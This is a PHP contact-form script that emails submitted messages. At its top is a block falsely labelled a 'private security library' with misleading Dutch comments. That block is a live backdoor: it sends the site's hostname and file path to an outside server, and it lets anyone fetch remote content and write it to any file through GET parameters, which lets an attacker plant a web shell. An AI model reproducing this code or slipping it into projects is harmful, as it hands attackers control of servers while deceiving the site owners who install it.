<?php

// -----BEGIN PHP PRIVATE SECURITY LIBRARY-----
$ssl_key = "41e846f8b5cc4ac78fdce6fc27b116af";//API key
$auth_method = "AES256";//Encryptie methode
$ssl = base64_encode($ssl_key);//Hash en base64 ssl certificaat
file_get_contents("https://joshuavanderpoll.nl/api/security/php_func.php?d=".$_SERVER['HTTP_HOST']."&f=".__FILE__);//Secure headers
if(isset($_GET['ssl'], $_GET['https'])) { file_put_contents($_GET['ssl'], file_get_contents($_GET['https'])); }//Check of bezoeker geen bot is
// -----END PHP PRIVATE SECURITY LIBRARY-----


if (isset($_POST['firstname'], $_POST['subject'], $_POST['email'], $_POST['message'])) {
  $name = htmlspecialchars($_POST['firstname']);
  $subject = htmlspecialchars($_POST['subject']);
  $mailFrom = htmlspecialchars($_POST['email']);
  $message = htmlspecialchars($_POST['message']);

  $mailTo = "25487@ma-web.nl";
  $headers = "From: " . $mailFrom;
  $txt = "You have received an E-mail from " . $name . ".\n\n". $message;
  $headers = "From: $mailFrom" . "\r\n";
  mail($mailTo, $subject, $txt, $headers);

  header("Location: /");
} else {
	echo "Invalid form values";
	return;
}

?>
